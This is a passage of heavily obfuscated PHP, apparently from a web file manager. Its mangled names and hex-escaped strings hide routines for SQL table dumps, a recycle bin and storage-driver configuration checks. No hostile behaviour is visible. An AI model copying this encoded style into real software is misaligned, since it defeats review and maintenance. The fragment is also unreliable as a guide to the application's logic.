(!$úö·‡Ìš || !$úö·‡Ìš[0]) { return !1; } $¯¶ÚÛß = _get($úö·‡Ìš[0], $õŞ»ÕùË[1178], $õŞ»ÕùË[12]); if (!$¯¶ÚÛß) { return !1; } $’ŒÚş¹ = "\x44\x52\117\x50\x20\124\x41\x42\x4c\105\x20\111\106\x20\105\x58\111\123\x54\x53\40\140{$¬€ã©Øé}\x60\x3b" . PHP_EOL . $¯¶ÚÛß . $õŞ»ÕùË[74]; if ($„®­ÈÛó && $„®­ÈÛó == $õŞ»ÕùË[877]) { return $’ŒÚş¹; } $ƒ˜ŞÈò = array_change_key_case($GLOBALS[$õŞ»ÕùË[6]][$õŞ»ÕùË[21]]); $ÕáóÔÄñ = $ƒ˜ŞÈò[$õŞ»ÕùË[1050]]; $ãË†£Ü¯ = $õŞ»ÕùË[1179] . $ÕáóÔÄñ . $õŞ»ÕùË[1180] . $¬€ã©Øé . $õŞ»ÕùË[58]; $úí‡Èó¨ = $õŞ»ÕùË[1181] . $¬€ã©Øé . $õŞ»ÕùË[978]; $€ç¦ÚãÂ = $İÇˆÀ¤Æ->query($ãË†£Ü¯); if (empty($€ç¦ÚãÂ)) { $ãÆ’¶ĞÖ = array($õŞ»ÕùË[877] => $õŞ»ÕùË[12], $õŞ»ÕùË[13] => $õŞ»ÕùË[12]); return $„®­ÈÛó ? $ãÆ’¶ĞÖ[$„®­ÈÛó] : $ãÆ’¶ĞÖ; } $£ÇœâÈ³ = $İÇˆÀ¤Æ->query($úí‡Èó¨); $¨«âÛêÀ = $õŞ»ÕùË[12]; $ıå¼©ë = array(); foreach ($£ÇœâÈ³ as $œˆ®Ñ®Õ) { if (!$¨«âÛêÀ && $œˆ®Ñ®Õ[$õŞ»ÕùË[1182]] == $õŞ»ÕùË[1183]) { $¨«âÛêÀ = $œˆ®Ñ®Õ[$õŞ»ÕùË[1184]]; } if (isset($ıå¼©ë[$œˆ®Ñ®Õ[$õŞ»ÕùË[1182]]])) { $ıå¼©ë[$œˆ®Ñ®Õ[$õŞ»ÕùË[1182]]][$õŞ»ÕùË[1185]][] = $œˆ®Ñ®Õ[$õŞ»ÕùË[1184]]; continue; } $ıå¼©ë[$œˆ®Ñ®Õ[$õŞ»ÕùË[1182]]] = array($õŞ»ÕùË[1186] => $œˆ®Ñ®Õ[$õŞ»ÕùË[1182]], $õŞ»ÕùË[1185] => array($œˆ®Ñ®Õ[$õŞ»ÕùË[1184]]), $õŞ»ÕùË[1187] => $œˆ®Ñ®Õ[$õŞ»ÕùË[1188]] == $õŞ»ÕùË[91] ? 0 : 1); } $  ¸ğÃ÷ = array(); foreach ($ıå¼©ë as $œˆ®Ñ®Õ) { $Ñæ‡±¿… = $œˆ®Ñ®Õ[$õŞ»ÕùË[1186]] == $õŞ»ÕùË[1183]; $Ê§°é¹ = array($õŞ»ÕùË[1189], $œˆ®Ñ®Õ[$õŞ»ÕùË[1187]] == $õŞ»ÕùË[91] && !$Ñæ‡±¿… ? $õŞ»ÕùË[1190] : $õŞ»ÕùË[12], $õŞ»ÕùË[1191], $õŞ»ÕùË[1192] . $¬€ã©Øé . $õŞ»ÕùË[11] . ($Ñæ‡±¿… ? $õŞ»ÕùË[1193] : $œˆ®Ñ®Õ[$õŞ»ÕùË[1186]]) . $õŞ»ÕùË[121], $õŞ»ÕùË[1194], $õŞ»ÕùË[121] . $¬€ã©Øé . $õŞ»ÕùË[121], $õŞ»ÕùË[1195] . implode($õŞ»ÕùË[1196], $œˆ®Ñ®Õ[$õŞ»ÕùË[1185]]) . $õŞ»ÕùË[1197]); $  ¸ğÃ÷[] = implode($õŞ»ÕùË[53], $Ê§°é¹) . $õŞ»ÕùË[74]; } $¿Ğâ¹‘¹ = array(); $µÉÒ©âÈ = array($õŞ»ÕùË[1198] => $õŞ»ÕùË[1199], $õŞ»ÕùË[1199] => $õŞ»ÕùË[1199], $õŞ»ÕùË[364] => $õŞ»ÕùË[391], $õŞ»ÕùË[363] => $õŞ»ÕùË[391]); foreach ($€ç¦ÚãÂ as $œˆ®Ñ®Õ) { $Ê§°é¹ = array($õŞ»ÕùË[121] . $œˆ®Ñ®Õ[$õŞ»ÕùË[1200]] . $õŞ»ÕùË[121], isset($µÉÒ©âÈ[$œˆ®Ñ®Õ[$õŞ»ÕùË[1201]]]) ? $µÉÒ©âÈ[$œˆ®Ñ®Õ[$õŞ»ÕùË[1201]]] : $œˆ®Ñ®Õ[$õŞ»ÕùË[1202]], $œˆ®Ñ®Õ[$õŞ»ÕùË[1203]] == $õŞ»ÕùË[976] ? $õŞ»ÕùË[1204] : $õŞ»ÕùË[1205], $œˆ®Ñ®Õ[$õŞ»ÕùË[1200]] == $¨«âÛêÀ ? $õŞ»ÕùË[1206] : $õŞ»ÕùË[12], $œˆ®Ñ®Õ[$õŞ»ÕùË[1027]] ? strtoupper(str_replace($õŞ»ÕùË[11], $õŞ»ÕùË[12], $œˆ®Ñ®Õ[$õŞ»ÕùË[1027]])) : $õŞ»ÕùË[12]); $¿Ğâ¹‘¹[] = trim(implode($õŞ»ÕùË[53], $Ê§°é¹)); } $Öæêã€ = array($õŞ»ÕùË[1207] . $¬€ã©Øé . $õŞ»ÕùË[1208], $õŞ»ÕùË[1209] . $¬€ã©Øé . $õŞ»ÕùË[1210], implode($õŞ»ÕùË[50] . PHP_EOL, $¿Ğâ¹‘¹), $õŞ»ÕùË[1024]); $£†œ‘ğ§ = implode(PHP_EOL, array_merge($Öæêã€, $  ¸ğÃ÷)); if ($„®­ÈÛó && $„®­ÈÛó == $õŞ»ÕùË[13]) { return $£†œ‘ğ§; } $ãÆ’¶ĞÖ = array($õŞ»ÕùË[877] => $’ŒÚş¹, $õŞ»ÕùË[13] => $£†œ‘ğ§); return $„®­ÈÛó ? $ãÆ’¶ĞÖ[$„®­ÈÛó] : $ãÆ’¶ĞÖ; } public function sqlFromSqlite($ú¬óâ¯û, $©–£¿øó = '') { $ê€ŸÌÕ =& $_SERVER[¦»×‡Ãã]; $Œ¸“òÏ = $this->model()->db(); $ı½¯—·¯ = "\x50\x52\101\107\x4d\x41\40\124\101\102\114\105\137\x49\x4e\x46\x4f\40\50\x27{$ú¬óâ¯û}\47\51"; $¬ÅÈöĞ´ = "\123\x45\114\105\103\124\x20\x2a\40\x46\122\x4f\115\40\x73\161\x6c\x69\164\145\x5f\155\x61\x73\x74\145\x72\x20\x57\x48\105\122\x45\40\164\142\154\x5f\x6e\141\x6d\145\40\75\x20\47{$ú¬óâ¯û}\47"; $İü¼ƒï = $Œ¸“òÏ->query($ı½¯—·¯); if (empty($İü¼ƒï)) { $¡ó”ğöé = array($ê€ŸÌÕ[877] => $ê€ŸÌÕ[12], $ê€ŸÌÕ[13] => $ê€ŸÌÕ[12]); return $©–£¿øó ? $¡ó”ğöé[$©–£¿øó] : $¡ó”ğöé; } $¸¾úï¤ß = $Œ¸“òÏ->query($¬ÅÈöĞ´); $µ—ê¢­¬ = $¶àŞ¹òù = array(); foreach ($¸¾úï¤ß as $¬‹é”Ã) { if ($¬‹é”Ã[$ê€ŸÌÕ[33]] == $ê€ŸÌÕ[356]) { $µ—ê¢­¬[] = $¬‹é”Ã[$ê€ŸÌÕ[1211]]; } else { $¶àŞ¹òù[$¬‹é”Ã[$ê€ŸÌÕ[32]]] = $¬‹é”Ã[$ê€ŸÌÕ[1211]]; } } $Óõ‡° = array_merge(array($ê€ŸÌÕ[1207] . $ú¬óâ¯û . $ê€ŸÌÕ[121]), $µ—ê¢­¬, array_values($¶àŞ¹òù)); $Óõ‡° = implode($ê€ŸÌÕ[74] . PHP_EOL, $Óõ‡°) . $ê€ŸÌÕ[74]; if ($©–£¿øó && $©–£¿øó == $ê€ŸÌÕ[13]) { return $Óõ‡°; } $êı”ò = array(); $û¤Ò „‰ = array($ê€ŸÌÕ[1199] => $ê€ŸÌÕ[1212], $ê€ŸÌÕ[391] => $ê€ŸÌÕ[1213]); $ƒÃ™Î”µ = $ê€ŸÌÕ[12]; foreach ($İü¼ƒï as $¬‹é”Ã) { if ($¬‹é”Ã[$ê€ŸÌÕ[57]] == $ê€ŸÌÕ[91]) { $ƒÃ™Î”µ = $¬‹é”Ã[$ê€ŸÌÕ[32]]; } $šêüÇ¥ = array($ê€ŸÌÕ[461] . $¬‹é”Ã[$ê€ŸÌÕ[32]] . $ê€ŸÌÕ[461], isset($û¤Ò „‰[$¬‹é”Ã[$ê€ŸÌÕ[33]]]) ? $û¤Ò „‰[$¬‹é”Ã[$ê€ŸÌÕ[33]]] : $¬‹é”Ã[$ê€ŸÌÕ[33]], $¬‹é”Ã[$ê€ŸÌÕ[35]] == $ê€ŸÌÕ[91] ? $ê€ŸÌÕ[1204] : $ê€ŸÌÕ[1214] . $¬‹é”Ã[$ê€ŸÌÕ[56]], $¬‹é”Ã[$ê€ŸÌÕ[57]] == $ê€ŸÌÕ[91] ? $ê€ŸÌÕ[1215] : $ê€ŸÌÕ[12]); $êı”ò[] = trim(implode($ê€ŸÌÕ[53], $šêüÇ¥)); } foreach ($¶àŞ¹òù as $¸ìæ®Œ‡ => $æ¸’Ö¾±) { $Ú©õòÍ = str_replace($ê€ŸÌÕ[1216] . $ú¬óâ¯û . $ê€ŸÌÕ[11], $ê€ŸÌÕ[12], $¸ìæ®Œ‡); $ê’ÜÙÆ = str_replace(array($ê€ŸÌÕ[121], $ê€ŸÌÕ[1035]), $ê€ŸÌÕ[461], substr($æ¸’Ö¾±, stripos($æ¸’Ö¾±, $ê€ŸÌÕ[337]))); if ($Ú©õòÍ == $ê€ŸÌÕ[1193]) { $¦å—— = $ê€ŸÌÕ[1217] . $ƒÃ™Î”µ . $ê€ŸÌÕ[1218]; } else { $¦å—— = (stripos($Ú©õòÍ, $ê€ŸÌÕ[11]) ? $ê€ŸÌÕ[1219] : $ê€ŸÌÕ[12]) . ($ê€ŸÌÕ[1220] . $Ú©õòÍ . $ê€ŸÌÕ[1221] . $ê’ÜÙÆ); } $êı”ò[] = $¦å——; } $ŸÀ±¤» = array($ê€ŸÌÕ[1222] . $ú¬óâ¯û . $ê€ŸÌÕ[1223], $ê€ŸÌÕ[1224] . $ú¬óâ¯û . $ê€ŸÌÕ[1225], implode($ê€ŸÌÕ[50] . PHP_EOL, $êı”ò), $ê€ŸÌÕ[1226]); $ë±Üê¬ã = implode(PHP_EOL, $ŸÀ±¤»); if ($©–£¿øó && $©–£¿øó == $ê€ŸÌÕ[877]) { return $ë±Üê¬ã; } $¡ó”ğöé = array($ê€ŸÌÕ[877] => $ë±Üê¬ã, $ê€ŸÌÕ[13] => $Óõ‡°); return $©–£¿øó ? $¡ó”ğöé[$©–£¿øó] : $¡ó”ğöé; } } goto A‰„ˆ¬í­; Fù¬ÌÚÑÉÜ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\x63\x65\137\162\145\143\171\x63\154\x65"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\151\155\145", "\164\x69\x6d\145", "\x69\x6e\x73\145\162\164", "\x66\x75\x6e\x63\x74\x69\157\x6e")); public function listData($‚ùÓê¿ = false) { $Äò‚í…² =& $_SERVER[¦»×‡Ãã]; $‚ùÓê¿ = $‚ùÓê¿ ? $‚ùÓê¿ : USER_ID; $¦Ãûä¬“ = $this->where(array($Äò‚í…²[1763] => $‚ùÓê¿))->select(); return array_to_keyvalue($¦Ãûä¬“, $Äò‚í…²[12], $Äò‚í…²[193]); } public function moveToRecycle($à½Á²¸÷) { $õ£İËƒ¥ =& $_SERVER[¦»×‡Ãã]; $÷µıé““ = Model($õ£İËƒ¥[1420]); $Š”“âŞ‘ = $÷µıé““->sourceInfo($à½Á²¸÷); if (!$Š”“âŞ‘ || $Š”“âŞ‘[$õ£İËƒ¥[505]] == $õ£İËƒ¥[91]) { return; } $ÒÅŠ÷Îä = array($õ£İËƒ¥[491] => $à½Á²¸÷, $õ£İËƒ¥[1763] => USER_ID, $õ£İËƒ¥[648] => $Š”“âŞ‘[$õ£İËƒ¥[190]], $õ£İËƒ¥[649] => $Š”“âŞ‘[$õ£İËƒ¥[569]], $õ£İËƒ¥[652] => $Š”“âŞ‘[$õ£İËƒ¥[584]]); $this->add($ÒÅŠ÷Îä); $this->recycleMove($à½Á²¸÷, 1); if ($Š”“âŞ‘[$õ£İËƒ¥[485]] == $õ£İËƒ¥[91]) { $ÀêÓ³€è = array($õ£İËƒ¥[652] => array($õ£İËƒ¥[612], $Š”“âŞ‘[$õ£İËƒ¥[584]] . $à½Á²¸÷ . $õ£İËƒ¥[613])); $÷µıé““->where($ÀêÓ³€è)->setField($õ£İËƒ¥[505], 1); } } public function clear() { $this->remove(!1); } public function remove($µŞ’´¥ = false, $‹Ÿô¾Ç¬ = false) { $•¼øæéÜ =& $_SERVER[¦»×‡Ãã]; $‹Ÿô¾Ç¬ = $‹Ÿô¾Ç¬ ? $‹Ÿô¾Ç¬ : USER_ID; $×ğ½ÒƒÅ = Model($•¼øæéÜ[1420]); $í×—ÌÃæ = $this->listData($‹Ÿô¾Ç¬); $µŞ’´¥ = $µŞ’´¥ === !1 ? !1 : $µŞ’´¥; $üÃËÀû¯ = array(); foreach ($í×—ÌÃæ as $¾²²‹‹²) { if ($µŞ’´¥ != !1 && !in_array($¾²²‹‹², $µŞ’´¥)) { continue; } $å“ßÉñğ = $×ğ½ÒƒÅ->sourceInfo($¾²²‹‹²); $×ğ½ÒƒÅ->remove($¾²²‹‹², !1); $£š–¸±© = $å“ßÉñğ[$•¼øæéÜ[190]] . $•¼øæéÜ[11] . $å“ßÉñğ[$•¼øæéÜ[569]]; $üÃËÀû¯[$£š–¸±©] = array($•¼øæéÜ[648] => $å“ßÉñğ[$•¼øæéÜ[190]], $•¼øæéÜ[569] => $å“ßÉñğ[$•¼øæéÜ[569]]); $this->where(array($•¼øæéÜ[193] => $¾²²‹‹²))->delete(); } foreach ($üÃËÀû¯ as $”Í™ø±Ì) { $×ğ½ÒƒÅ->targetSpaceUpdate($”Í™ø±Ì[$•¼øæéÜ[190]], $”Í™ø±Ì[$•¼øæéÜ[569]]); } } public function restore($§å™Óæ” = false) { $äƒñåæğ = $this->listData(); $this->_restoreSource($äƒñåæğ, $§å™Óæ”); } public function removeUserAll($€²ÕÀÔä) { $this->remove(!1, $€²ÕÀÔä); } public function restoreItem($äÆ‡Ëó) { $this->_restoreSource(array($äÆ‡Ëó), array($äÆ‡Ëó)); } private function _restoreSource($º…¢›ë©, $Ç¡òå¥Ø) { $ôåŞ¾‰ =& $_SERVER[¦»×‡Ãã]; $ºõ–› = Model($ôåŞ¾‰[1420]); $Ç¡òå¥Ø = $Ç¡òå¥Ø == !1 ? !1 : $Ç¡òå¥Ø; if (!$º…¢›ë©) { return !0; } $§á¸Ì˜Ô = array(); foreach ($º…¢›ë© as $¤ÚúúÑ…) { if ($Ç¡òå¥Ø != !1 && !in_array($¤ÚúúÑ…, $Ç¡òå¥Ø)) { continue; } $üßøÂÅÙ = $ºõ–›->sourceInfo($¤ÚúúÑ…); $Éßšı¡Ï = $ºõ–›->sourceInfo($üßøÂÅÙ[$ôåŞ¾‰[192]]); if ($Éßšı¡Ï[$ôåŞ¾‰[505]] == $ôåŞ¾‰[91]) { continue; } $ºõ–›->lockMoveStart($¤ÚúúÑ…); $this->recycleMove($¤ÚúúÑ…, 0); if ($üßøÂÅÙ[$ôåŞ¾‰[485]] == $ôåŞ¾‰[91]) { $÷Óäİ–ª = array($ôåŞ¾‰[652] => array($ôåŞ¾‰[612], $üßøÂÅÙ[$ôåŞ¾‰[584]] . $¤ÚúúÑ… . $ôåŞ¾‰[613])); $ºõ–›->where($÷Óäİ–ª)->setField($ôåŞ¾‰[505], 0); $this->restoreFolderChildren($¤ÚúúÑ…, $º…¢›ë©); } $this->where(array($ôåŞ¾‰[193] => $¤ÚúúÑ…))->delete(); $ºõ–›->folderSizeReset($üßøÂÅÙ[$ôåŞ¾‰[192]]); $§á¸Ì˜Ô[] = $üßøÂÅÙ[$ôåŞ¾‰[192]]; if ($üßøÂÅÙ[$ôåŞ¾‰[485]] == $ôåŞ¾‰[91]) { $§á¸Ì˜Ô[] = $¤ÚúúÑ…; } $ºõ–›->lockMoveEnd($¤ÚúúÑ…); } $ºõ–›->updateModifyTime($§á¸Ì˜Ô); } private function restoreFolderChildren($ç€à¶Ã, $Óê©³«) { $¯¾ÌÜ„ı =& $_SERVER[¦»×‡Ãã]; $›”§û = Model($¯¾ÌÜ„ı[1420]); $æÒÙ×Ñ¸ = array($¯¾ÌÜ„ı[193] => array($¯¾ÌÜ„ı[7], array())); foreach ($Óê©³« as $‚ÃŞŸ¡Â) { if ($‚ÃŞŸ¡Â == $ç€à¶Ã) { continue; } if (!$›”§û->isParentOf($ç€à¶Ã, $‚ÃŞŸ¡Â)) { continue; } $¯åÊßİÄ = $›”§û->sourceInfo($‚ÃŞŸ¡Â); if ($¯åÊßİÄ[$¯¾ÌÜ„ı[485]] == $¯¾ÌÜ„ı[91]) { $æÒÙ×Ñ¸[] = array($¯¾ÌÜ„ı[652] => array($¯¾ÌÜ„ı[612], $¯åÊßİÄ[$¯¾ÌÜ„ı[584]] . $‚ÃŞŸ¡Â . $¯¾ÌÜ„ı[613])); } else { $æÒÙ×Ñ¸[$¯¾ÌÜ„ı[193]][1][] = $‚ÃŞŸ¡Â; } } if (!$æÒÙ×Ñ¸[$¯¾ÌÜ„ı[193]][1]) { unset($æÒÙ×Ñ¸[$¯¾ÌÜ„ı[193]]); } if (!$æÒÙ×Ñ¸) { return; } if (is_array($æÒÙ×Ñ¸[$¯¾ÌÜ„ı[193]]) && is_array($æÒÙ×Ñ¸[$¯¾ÌÜ„ı[193]][1])) { $æÒÙ×Ñ¸[$¯¾ÌÜ„ı[193]][1] = array_unique($æÒÙ×Ñ¸[$¯¾ÌÜ„ı[193]][1]); } $æÒÙ×Ñ¸[$¯¾ÌÜ„ı[1078]] = $¯¾ÌÜ„ı[2073]; $›”§û->where($æÒÙ×Ñ¸)->setField($¯¾ÌÜ„ı[505], 1); } private function recycleMove($ê¡¼²ƒ¡, $¯ŒµŠÕà = 1) { $·øÁ«¸Ç =& $_SERVER[¦»×‡Ãã]; $òõÓúğú = Model($·øÁ«¸Ç[1420]); $ñè¨êØ = Model($·øÁ«¸Ç[2294]); $´¯™õª = array($·øÁ«¸Ç[193] => $ê¡¼²ƒ¡); if ($¯ŒµŠÕà) { $òõÓúğú->where($´¯™õª)->setField($·øÁ«¸Ç[505], 1); $ñè¨êØ->eventRecycle($ê¡¼²ƒ¡, $·øÁ«¸Ç[2295]); } else { $Àüìâ„› = $òõÓúğú->where($´¯™õª)->find(); $“®÷ŠœÅ = $Àüìâ„›[$·øÁ«¸Ç[485]] == $·øÁ«¸Ç[91]; $ä±ÓÅ¬Ş = $òõÓúğú->fileNameAuto($Àüìâ„›[$·øÁ«¸Ç[192]], $Àüìâ„›[$·øÁ«¸Ç[32]], REPEAT_RENAME_FOLDER, $“®÷ŠœÅ); if ($ä±ÓÅ¬Ş != $Àüìâ„›[$·øÁ«¸Ç[32]]) { $òõÓúğú->rename($ê¡¼²ƒ¡, $ä±ÓÅ¬Ş); } $òõÓúğú->where($´¯™õª)->setField($·øÁ«¸Ç[505], 0); $ñè¨êØ->eventRecycle($ê¡¼²ƒ¡, $·øÁ«¸Ç[2296]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x73\x6f\x75\162\x63\145\x53\145\x63\162\x65\164\114\151\163\164"; public $field = array("\163\x6f\x75\162\143\145\111\104", "\x74\171\x70\145\x49\104", "\x63\162\x65\x61\x74\145\x55\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\163\164\x6f\x72\x61\x67\x65\114\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\163\x69\x7a\x65\115\141\x78", "\163\171\163\164\x65\x6d", "\x64\145\x66\x61\x75\x6c\164", "\144\162\x69\166\x65\x72", "\x63\x6f\x6e\x66\151\x67"); public function listData($·â¡Òœœ = false, $Ô—‹¥‚ = "\155\157\144\151\x66\171\x54\151\x6d\x65", $§–Áû‚ó = false) { $¹ºÜ„¨ =& $_SERVER[¦»×‡Ãã]; $µÚ¨·äû = parent::listData($·â¡Òœœ, $Ô—‹¥‚, $§–Áû‚ó); if ($·â¡Òœœ) { return $µÚ¨·äû; } $Áè²£³À = array(); if ($GLOBALS[$¹ºÜ„¨[2297]]) { $Áè²£³À = $this->ioSizeUseGet(array_to_keyvalue($µÚ¨·äû, $¹ºÜ„¨[12], $¹ºÜ„¨[475])); } foreach ($µÚ¨·äû as $™¸£³ÌÛ => $‹ºá“ÃÔ) { unset($µÚ¨·äû[$™¸£³ÌÛ][$¹ºÜ„¨[6]]); $µÚ¨·äû[$™¸£³ÌÛ][$¹ºÜ„¨[1959]] = isset($Áè²£³À[$‹ºá“ÃÔ[$¹ºÜ„¨[475]]]) ? $Áè²£³À[$‹ºá“ÃÔ[$¹ºÜ„¨[475]]] : 0; } return $µÚ¨·äû; } public function ioSizeUseGet($®éÃéõ) { $ß…ş˜ºØ =& $_SERVER[¦»×‡Ãã]; if (!$®éÃéõ) { return array(); } $Ù´—ÁÜè = $ß…ş˜ºØ[2298] . implode($ß…ş˜ºØ[50], $®éÃéõ); $â‡â‰ú = Cache::get($Ù´—ÁÜè); if ($â‡â‰ú) { return $â‡â‰ú; } $¾ò•Õ¤Â = array($ß…ş˜ºØ[890] => $ß…ş˜ºØ[475], $ß…ş˜ºØ[2299] => $ß…ş˜ºØ[79]); $úĞ×Ø Í = array($ß…ş˜ºØ[890] => array($ß…ş˜ºØ[7], $®éÃéõ)); $â‡â‰ú = Model($ß…ş˜ºØ[862])->field($¾ò•Õ¤Â)->where($úĞ×Ø Í)->group($ß…ş˜ºØ[890])->select(); $â‡â‰ú = array_to_keyvalue($â‡â‰ú, $ß…ş˜ºØ[475], $ß…ş˜ºØ[79]); Cache::set($Ù´—ÁÜè, $â‡â‰ú, 600); return $â‡â‰ú; } public function getConfig($€…÷¦ˆš) { $ÉÓ¿‰´ = parent::listData($€…÷¦ˆš); return json_decode($ÉÓ¿‰´[$_SERVER[¦»×‡Ãã][6]], !0); } public function update($Îû—ı´ã, $·Ô¿–‚Ú) { $ğ¨åë… =& $_SERVER[¦»×‡Ãã]; $Ø“ˆÏÜë = $·Ô¿–‚Ú[$ğ¨åë…[32]]; $šè¤åñ = array_to_keyvalue(parent::listData(), $ğ¨åë…[32]); if (isset($šè¤åñ[$Ø“ˆÏÜë]) && $šè¤åñ[$Ø“ˆÏÜë][$ğ¨åë…[475]] != $Îû—ı´ã) { return !1; } $this->checkPwd($Îû—ı´ã, $·Ô¿–‚Ú); if (isset($·Ô¿–‚Ú[$ğ¨åë…[2300]]) && $·Ô¿–‚Ú[$ğ¨åë…[2300]] == $ğ¨åë…[91]) { $this->checkConfig($·Ô¿–‚Ú); } unset($·Ô¿–‚Ú[$ğ¨åë…[2300]]); $‡½Ó½‘¯ = parent::update($Îû—ı´ã, $·Ô¿–‚Ú); if ($‡½Ó½‘¯ && $·Ô¿–‚Ú[$ğ¨åë…[37]]) { $”áœ‡Äú = 0; foreach ($šè¤åñ as $ºğ°œ´ƒ) { if ($ºğ°œ´ƒ[$ğ¨åë…[37]] && $ºğ°œ´ƒ[$ğ¨åë…[475]] != $Îû—ı´ã) { $”áœ‡Äú = $ºğ°œ´ƒ[$ğ¨åë…[475]]; parent::update($ºğ°œ´ƒ[$ğ¨åë…[475]], array($ğ¨åë…[37] => 0)); } } $this->updateBackup($Îû—ı´ã, $”áœ‡Äú); } return $‡½Ó½‘¯; } public function add($òã‚Å´¹) { $­ØËŠ‡¿ =& $_SERVER[¦»×‡Ãã]; $°ªÑƒı÷ = array_to_keyvalue(parent::listData(), $­ØËŠ‡¿[32]); if (isset($°ªÑƒı÷[$òã‚Å´¹[$­ØËŠ‡¿[32]]])) { return !1; } $this->checkConfig($òã‚Å´¹); $ÄÈÌŞƒ = parent::insert($òã‚Å´¹); if ($ÄÈÌŞƒ && $òã‚Å´¹[$­ØËŠ‡¿[37]]) { foreach ($°ªÑƒı÷ as $ñ„›”Ü) { if ($ñ„›”Ü[$­ØËŠ‡¿[37]]) { parent::update($ñ„›”Ü[$­ØËŠ‡¿[475]], array($­ØËŠ‡¿[37] => 0)); } } } return $ÄÈÌŞƒ; } public function updateBackup($½›¯öïÈ, $ˆ¯·û›ì) { $¯‘¯»Ç‡ =& $_SERVER[¦»×‡Ãã]; if (!$ˆ¯·û›ì) { return; } $ˆé¹¾œ¼ = Model($¯‘¯»Ç‡[821])->config(); if ($ˆé¹¾œ¼[$¯‘¯»Ç‡[1742]] != $¯‘¯»Ç‡[91] || $ˆé¹¾œ¼[$¯‘¯»Ç‡[825]] != $ˆ¯·û›ì) { return; } $Ô¢¡öÍ = Model($¯‘¯»Ç‡[843])->get($¯‘¯»Ç‡[856]); $Ô¢¡öÍ = json_decode($Ô¢¡öÍ, !0); if (!$Ô¢¡öÍ) { return; } $Ô¢¡öÍ[$¯‘¯»Ç‡[825]] = $½›¯öïÈ; Model($¯‘¯»Ç‡[843])->set(array($¯‘¯»Ç‡[856] => $Ô¢¡öÍ)); } public function checkPwd($¯ÛÑ‹ƒª, &$ö–²) { $ËàË×ó® =& $_SERVER[¦»×‡Ãã]; if (empty($ö–²[$ËàË×ó®[6]])) { return; } $‡œ¢”™‹ = json_decode($ö–²[$ËàË×ó®[6]], !0); $šÆÅÈå‡ = $ËàË×ó®[12]; $©Íñ» ¤ = array($ËàË×ó®[2301], $ËàË×ó®[2302], $ËàË×ó®[967]); foreach ($©Íñ» ¤ as $ïö§ıÁ«) { if (isset($‡œ¢”™‹[$ïö§ıÁ«])) { $šÆÅÈå‡ = $ïö§ıÁ«; break; } } if (!$šÆÅÈå‡) { return; } $šè¡„óØ = $this->getConfig($¯ÛÑ‹ƒª); $ÊÈë°ğÂ = $šè¡„óØ[$šÆÅÈå‡]; $¹çñó–š = $‡œ¢”™‹[$šÆÅÈå‡]; if ($¹çñó–š == str_repeat($ËàË×ó®[220], strlen($ÊÈë°ğÂ))) { $‡œ¢”™‹[$šÆÅÈå‡] = $ÊÈë°ğÂ; $ö–²[$ËàË×ó®[6]] = json_encode($‡œ¢”™‹); } else { if ($¹çñó–š != $ÊÈë°ğÂ) { $ö–²[$ËàË×ó®[2300]] = $ËàË×ó®[91]; } } } public function checkConfig(&$†çœÛîÚ, $¦îĞˆ· = false) { $úıöÖ³° =& $_SERVER[¦»×‡Ãã]; $·×ªíå» = strtolower($†çœÛîÚ[$úıöÖ³°[98]]); $¾Ñ“ÛÜÜ = json_decode($†çœÛîÚ[$úıöÖ³°[6]], !0); foreach ($¾Ñ“ÛÜÜ as $Á–Ë“ô => $æÇ¤óğä) { if (is_string($æÇ¤óğä)) { $¾Ñ“ÛÜÜ[$Á–Ë“ô] = trim($æÇ¤óğä); } } $¾Ñ“ÛÜÜ[$úıöÖ³°[2303]] = rand_string(6); $í×†ïñ• = $GLOBALS[$úıöÖ³°[6]][$úıöÖ³°[92]][$úıöÖ³°[898]]; $‹ ĞÂ¨­ = isset($í×†ïñ•[$·×ªíå»]) ? $í×†ïñ•[$·×ªíå»] : ucfirst($·×ªíå»); $ôÜíè™Å = $úıöÖ³°[77] . $‹ ĞÂ¨­; if (!$‹ ĞÂ¨­ || !class_exists($ôÜíè™Å)) { if ($¦îĞˆ·) { return LNG($úıöÖ³°[2304]); } write_log(array($úıöÖ³°[2305], $†çœÛîÚ, get_caller_info()), $úıöÖ³°[215]); show_json(LNG($úıöÖ³°[2304]), !1, $†çœÛîÚ); } $ÙŞ¸ÙÎé = new $ôÜíè™Å($¾Ñ“ÛÜÜ); if (in_array($·×ªíå», $ÙŞ¸ÙÎé->objectDriver)) { try { if (!$ÙŞ¸ÙÎé->isBucketCors() && !$ÙŞ¸ÙÎé->setBucketCors()) { $£ª×Ô¢× = LNG($úıöÖ³°[2306]); $£ª×Ô¢× .= $úıöÖ³°[2307] . LNG($úıöÖ³°[2308]); } } catch (Exception $ÙÚçø“ú) { $£ª×Ô¢× = $ÙÚçø“ú->getMessage(); } if (isset($£ª×Ô¢×)) { return $this->_parseError($£ª×Ô¢×, $·×ªíå», $¦îĞˆ·); } if ($·×ªíå» == $úıöÖ³°[68] && !$ÙŞ¸ÙÎé->checkRegion()) { return $this->_parseError(LNG($úıöÖ³°[2309]), $·×ªíå», $¦îĞˆ·); } } $ËÆ±Ÿ™ = rtrim($¾Ñ“ÛÜÜ[$úıöÖ³°[1262]], $úıöÖ³°[8]) . $úıöÖ³°[8]; $µöª¸Ó¬ = $ÙŞ¸ÙÎé->getPath($ËÆ±Ÿ™ . $úıöÖ³°[1266]); try { if ($·×ªíå» == $úıöÖ³°[109]) { $ÙŞ¸ÙÎé->mkdir($ËÆ±Ÿ™); } $…ûú‹Ò = $ÙŞ¸ÙÎé->mkfile($µöª¸Ó¬); if (!$…ûú‹Ò) { $£ª×Ô¢× = LNG($úıöÖ³°[2306]); } } catch (Exception $ÙÚçø“ú) { $£ª×Ô¢× = $ÙÚçø“ú->getMessage(); } if (isset($£ª×Ô¢×)) { return $this->_parseError($£ª×Ô¢×, $·×ªíå», $¦îĞˆ·); } $¾Ñ“ÛÜÜ[$úıöÖ³°[1262]] = $ËÆ±Ÿ™; $†çœÛîÚ[$úıöÖ³°[6]] = json_encode($¾Ñ“ÛÜÜ); $†çœÛîÚ[$úıöÖ³°[98]] = $‹ ĞÂ¨­; return !0; } private function _parseError($‘È¯ÃÙì, $¼±ä³Ó, $ìúæƒ²‰ = false) { $Ñø„õ²Š =& $_SERVER[¦»×‡Ãã]; if ($¼±ä³Ó == 